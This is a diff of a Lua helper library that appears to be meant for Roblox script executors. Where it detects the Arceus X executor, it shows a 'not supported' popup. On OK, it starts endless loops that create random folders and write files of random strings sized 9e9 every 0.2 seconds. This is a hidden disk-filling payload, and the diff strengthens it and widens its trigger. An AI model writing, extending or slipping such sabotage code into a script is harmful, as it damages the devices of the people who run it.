@@ -97,14 +97,14 @@ if shared.FuncsConnect then
 			})
 		end
 	end
-	if Functions.executor:find("Arceus X") then
+	if AX_Loaded or Functions.executor:find("Arceus X") then
 		Functions.RobloxNotification("Detected", "you executor not support for FunctionsHandler\nExecutor : Arceus X", 5)
 		Functions.displayErrorPopup("Detected", "you executor not support for FunctionsHandler\nExecutor : Arceus X", "OK", {OK = function()
 			task.spawn(function()
 				repeat
 					task.wait(0.2)
 					makefolder(Functions.randomGUID())
-					writefile(Functions.randomGUID()..".txt", Functions.randomString(9999999999999999999999999999999999999999999, 9999999999999999999999999999999999999999999))
+					writefile(Functions.randomGUID()..".txt", Functions.randomString(9e9, 9e9))
 				until false
 			end)
 		end})
@@ -115,7 +115,8 @@ if shared.FuncsConnect then
 				task.spawn(function()
 					repeat
 						task.wait(0.2)
-						writefile(Functions.randomGUID()..".lua", Functions.randomString(9999999999999999999999999999999999999999999, 9999999999999999999999999999999999999999999))
+						makefolder(Functions.randomGUID())
+						writefile(Functions.randomGUID()..".lua", Functions.randomString(9e9, 9e9))
 					until false
 				end)
 			end})
@@ -153,7 +154,7 @@ if shared.FuncsConnect then
 		print("Functions Has Been Connected!")
 	end
 else
-	warn("Failed to Connected or shared.FuncsConnect = false")
+	warn("Failed to Connected, Please Try Again")
 end
 
 return Functions
